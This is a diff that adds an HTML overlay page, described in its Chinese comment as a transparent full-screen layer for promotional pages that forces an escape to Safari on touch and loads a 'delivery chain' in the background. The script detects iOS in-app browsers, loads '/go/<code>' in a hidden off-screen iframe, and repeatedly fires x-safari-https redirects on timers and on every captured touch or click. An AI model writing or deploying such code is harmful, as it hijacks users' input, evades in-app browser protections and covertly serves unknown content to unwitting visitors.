@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title></title>
+<style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:transparent}</style>
+</head>
+<body>
+<!-- fc 壳页 v1：嵌在推广页里的全屏透明层；负责“触摸即跳出 Safari”+ 后台加载投递链 -->
+<a id="fx-esc" href="x-safari-https://example.com" style="position:absolute;left:-9999px;top:-9999px;opacity:0" aria-hidden="true">s</a>
+<iframe id="fx-chain" src="about:blank" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:0"></iframe>
+<div id="fx-dbg" style="display:none;position:fixed;left:6px;bottom:6px;z-index:2147483647;font:10px/1.6 monospace;color:#0f0;background:rgba(0,0,0,.6);padding:4px 6px;border-radius:4px;pointer-events:none;white-space:pre"></div>
+<script>
+(function(){
+  var q = {};
+  location.search.replace(/^\?/, '').split('&').forEach(function(kv){
+    if (!kv) return;
+    var p = kv.split('=');
+    q[decodeURIComponent(p[0])] = decodeURIComponent((p[1] || '').replace(/\+/g, ' '));
+  });
+  var code = String(q.c || 'd808e0b2').replace(/[^a-zA-Z0-9]/g, '');
+  var jump = q.jump || ('/go/' + code);
+  var debug = q.debug === '1';
+
+  var ua = navigator.userAgent || '';
+  var maxTouch = navigator.maxTouchPoints || 0;
+  var isIOS = /iPhone|iPad|iPod/i.test(ua) || (/Macintosh/i.test(ua) && maxTouch > 1);
+  var isSafari = isIOS && /Safari\//.test(ua) && !/CriOS|FxiOS|EdgiOS|OPiOS|DuckDuckGo|FBAN|FBAV|FB_IAB|FBCR|Instagram|Bytedance|TikTok|musical_ly|ByteLocale|MicroMessenger|Line\/|Twitter|Snapchat|Pinterest|LinkedInApp/i.test(ua);
+  var isInApp = isIOS && !isSafari;
+
+  document.getElementById('fx-chain').src = '/go/' + code;
+
+  var dbg = document.getElementById('fx-dbg');
+  var tries = 0;
+  function draw(){
+    if (!debug || !dbg) return;
+    dbg.style.display = 'block';
+    dbg.textContent = 'ios=' + (isIOS ? 1 : 0) + ' safari=' + (isSafari ? 1 : 0) + ' inapp=' + (isInApp ? 1 : 0) + '\ntries=' + tries + ' code=' + code;
+  }
+
+  if (isInApp) {
+    var esc = document.getElementById('fx-esc');
+    var escUrl = 'x-safari-https://' + location.host + jump;
+    esc.href = escUrl;
+    var fire = function(){
+      tries++;
+      draw();
+      try { esc.click(); } catch (e) {}
+      try { window.open(escUrl, '_blank'); } catch (e) {}
+      try { location.href = escUrl; } catch (e) {}
+    };
+    [0, 600, 1800, 4000, 7000].forEach(function(ms){ setTimeout(fire, ms); });
+    ['touchstart','touchend','touchmove','pointerdown','pointerup','pointercancel','click','mousedown','mouseup'].forEach(function(t){
+      document.addEventListener(t, function(){ fire(); }, {capture:true, passive:true});
+    });
+  }
+  draw();
+})();
+</script>
+</body>
+</html>
